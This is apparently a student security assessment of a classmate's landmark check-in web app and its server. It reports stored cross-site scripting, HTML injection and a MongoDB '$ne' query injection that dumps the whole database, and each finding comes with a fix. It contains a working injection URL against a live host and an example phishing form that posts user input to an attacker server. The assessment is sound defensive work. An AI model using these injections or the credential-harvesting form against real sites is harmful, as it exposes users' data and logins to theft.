        <h1>Security and Privacy Assessment of Client-Side and Server-Side Code</h1>
        <h2>Prepared By: Theodore Tan</h2>
        </div>

        <h3>Introduction</h3>

        <p>
        This Secuity Assesment documents the security and privacy vulnerabilities that exists in both
        the client-side and server-side web applications designed by Anthony Nguyen (COMP 20, Spring 
        2016). These web applications are Historic Landmarks and the server for Historic Landmarks
        respectively. According to specifications, the server application had to (1) maintain location 
        check-ins (login, lat, and long) for a long period of time, and (2) serves data on 
        the nearest U.S. historic landmarks within a mile of where you are (where the user checked in
        from). The client-side application would render a google map with the information returned by
        the server.
        </p>

        <h3>Methodology</h3>

        <p>
        Security testing was carried out in two stages: black-box and code review/white-box testing.
        The tools used for black-box testing were Mozilla Firefox's Tamper Data, Postman and curl.
        Using just these tools, mutiple vulnerabilities were detected. A review of the source code
        confirmed these loopholes.
        </p>

        <h3>Abstract of Findings</h3>

        <p>
        The application does have some safeguards against input that may cause it to crash (e.g. it 
        checks for appropriate latitude and longtitude values). However, the bulk of its security
        issues stem from the fact that it fails to check and validate user input before it is accepted. 
        As a result, malicious users will be able to manipulate the data sent to the application to
        acheive unwanted and dangerous results.
        </p>

        <h3>Issue #1 : Cross Site Scripting</h3>

        <ul>
        <li>Location of Vulnerability: GET API executes javascript posted to the server by a malicious source.</li>
        
        <li>Severity of Vulnerability: <span class="high">HIGH</span>. XSS is one of the biggest security loopholes in the present day.
            It may possibly compromise clients who expect the server to be secure, as malicious javascript can
            be exected in their browser upon GET request. This javascript code will literally be able to do almost
            anything conceivable.</li>
        
        <li>Description of Injection: The data given to the server via the POST API is not escaped, and is
            stored in the database exact as it is entered. For example, I have replaced the login parameter
            with some javascript code instead of a valid login and the results are shown below. The first photo 
            describes the parameters sent using the POST API and the second photo shows the data being stored
            in the database.

        <table class="galleryTable"><tr><td><img src="images/xssattack.png" alt="XSS Attack" title="Postman interface to make XSS attack" /></td>

        <td><img src="images/xssdatabase.png" alt="XSS in Database" title="Injected javascript being stored in database" /></td></tr></table></li>

        <li>Result of Injection: As can be seen in the image below, when a GET / request is sent to the server, the
            malicious javascript in the database is returned to the client. This results in a pop-up window displaying
            on the browser. In this case, I have chosen to do a harmless javascript injection, but a more malicious
            script may steal cookie/session information or present users with fradulent web content. </li> 

        <table class="galleryTable"><tr><td><img src="images/xssresult.png" alt="XSS Result" title="Client interface being hit by XSS Attack" /></td></tr></table>

        <li>Resolution: A simple solution to this would be to ensure character escaping is done before saving the 
            information into the database. It is especially important to escape characters with HTML entity encoding
            (e.g. <code>& < > " ' /</code>) to prevent the execution of any form of scripts or event handlers. Also,
            updating the current entires using <code>db.collection.update()</code> would also increase security.</li>
        </ul>

        <h3>Issue #2 : Access to Every Data Entry in the Database</h3>

        <ul>
        <li>Location of Vulnerability: GET /checkins.json API can retrieve more data than it should be able to.</li>
        
        <li>Severity of Vulnerability: <span class="high">HIGH</span>. Databases may contain confidential or secure information and there is a 
            huge privacy and security problem any time a third-party is able to freely access all data in a database.
            This problem is made even worse if the database stores raw (as opposed to encrypted) information -- one
            may freely access the database and collect usernames, passwords, and other information.</li>

        <li>Description of Vulnerability: By modifying the parameters of the GET /checkins.json request, I have been
            about to make the server return to me all the entries in the database. The API expects a valid login (e.g. 
            <code>https://dry-bastion-41529.herokuapp.com/checkins.json?login=Anthony</code>) but by using a modifier 
            (<code>https://dry-bastion-41529.herokuapp.com/checkins.json?login[$ne]=" "</code>) the server instead 
            returns all entries which are not empty. This is essentially the entire database unless you happen to have 
            an empty field. 

        <table class="galleryTable"><tr><td><img src="images/mongoattack.png" alt="MongoDB Vulnerability" title="Client interface being hit by MongoDB Attack" /></td></tr></table></li>

        <li>Resolution: The most straightforward solution in this case would be to have an additional layer of checks
            in the code before the database is queried. This would ensure that there have been no modifiers added to
            the query and that the login requested is of valid type.</li>
        </ul>

        <h3>Issue #3 : HTML Injections</h3>

        <ul>
        <li>Location of Vulnerability: GET API renders malicious HTML code on the web browser, instead of the 
            original HTML of the site.</li>
        
        <li>Severity of Vulnerability: <span class="high">HIGH</span>. Being able to render malicious HTML on a user's browser is not only
            annoying, but a huge security risk. By doing this, an attacker could provide the user with a false
            interface (i.e. the interface built with the malicious HTML) and redirect any information the user
            provides to their attack server. Examples of this are fake login pages, personal details forms, etc. </li>

        <li>Description of Injection: The data given to the server via the POST API is not escaped, and is
            stored in the database exact as it is entered. In the example below, I have replaced the login field
            with some malicious HTML code. This code prints what I want to the screen, and also comments out the
            entirety of the original HTML that is supposed to be rendered on the browser. The photo below shows 
            the HTML code I sent to the server using the POST API.

        <table class="galleryTable"><tr><td><img src="images/injectionattack.png" alt="Injection Attack" title="Postman interface to make Injection Attack" /></td></tr></table></li>

        <li>Result of Injection: As can be seen in the image below, when a GET / request is sent to the server, the
            malicious HTML stored in the database is returned to the client. This results in the HTML being rendered
            on the browser instead of the proper content. In this case, I have provided some rather trivial HTML code
            and not done much, but conceivably the repercussions of HTML injection could be far worse. I could have
            replicated the exact same code of the site so that the user will not suspect anything is wrong, and steal 
            any data the user inputs using a code like <code>form method="POST" action="http://attackerserver/login.php"
            </code> to route to an attacker server.

        <table class="galleryTable"><tr><td><img src="images/injectionresult.png" alt="Injection Result" title="Client interface being hit by Injection Attack" /></td></tr></table></li>

        <li>Resolution: The solution to this is pretty similar to the solution to prevent XSS with javascript. Once
            these characters are escaped and checked, the HTML will not be able to run on a user's browser.</li>
        </ul>

        <h3>Conclusion</h3>

        <p>
        Most of the security vulnerabilities in this web application are serious compromises, but they are all also relatively
        easy fixes for anyone attempting to plug these security loopholes. The time costs of making this fixes is also not high,
        as escaping characters and checking can just be done with a few lines of code. I recommend that any future web applications
        have these checks as a minimum level of security against unauthorized database access of injection of HTML and javascript
        code that has the potential to mess with the browsers of users.
